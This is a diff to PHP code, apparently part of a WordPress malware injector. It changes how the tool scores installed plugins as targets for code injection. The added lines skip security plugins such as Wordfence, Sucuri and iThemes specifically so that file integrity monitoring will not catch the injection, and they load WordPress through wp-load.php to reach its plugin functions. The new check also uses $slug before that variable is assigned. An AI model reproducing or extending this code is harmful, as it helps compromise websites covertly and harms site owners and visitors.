@@ -41,13 +41,21 @@ function _score_plugin($pfile, $pdata, $wroot) {
     elseif ($sz > 3000) $score += 2;
     else $score += 1;
 
+    // Security plugins — never inject (file integrity monitoring will detect)
+    $blacklist = array('wordfence','sucuri','ithemes','limit-login','loginizer',
+        'better-wp-security','defender','security','antimalware','gotmls',
+        'bulletproof','cerber','shield','malcare','virusdie','ninja-firewall',
+        'astra','hide-my-wp','secupress','wp-cerber');
+    foreach ($blacklist as $bl) {
+        if (strpos($slug, $bl) !== false) return -1;
+    }
+
     $pop = array('woocommerce','elementor','contact-form','jetpack','yoast',
-        'akismet','wordfence','updraft','really-simple','wpforms',
+        'akismet','updraft','really-simple','wpforms',
         'all-in-one','litespeed','w3-total','wp-super-cache',
         'redirection','duplicate-post','classic-editor','tinymce',
         'advanced-custom','tablepress','ninja-forms','mailchimp',
-        'google-analytics','monsterinsights','sucuri','ithemes',
-        'limit-login','loginizer');
+        'google-analytics','monsterinsights');
     $slug = strtolower(dirname($pfile));
     foreach ($pop as $pp) {
         if (strpos($slug, $pp) !== false) { $score += 5; break; }
@@ -67,6 +75,15 @@ function _score_plugin($pfile, $pdata, $wroot) {
 }
 
 function _find_injection_target($wroot) {
+    // Bootstrap WordPress if not already loaded (needed for get_plugins/get_option)
+    if (!function_exists('get_option')) {
+        $wp_load = $wroot . '/wp-load.php';
+        if (file_exists($wp_load)) {
+            @require_once $wp_load;
+        } else {
+            return null;
+        }
+    }
     if (!function_exists('get_plugins')) {
         require_once $wroot . '/wp-admin/includes/plugin.php';
     }
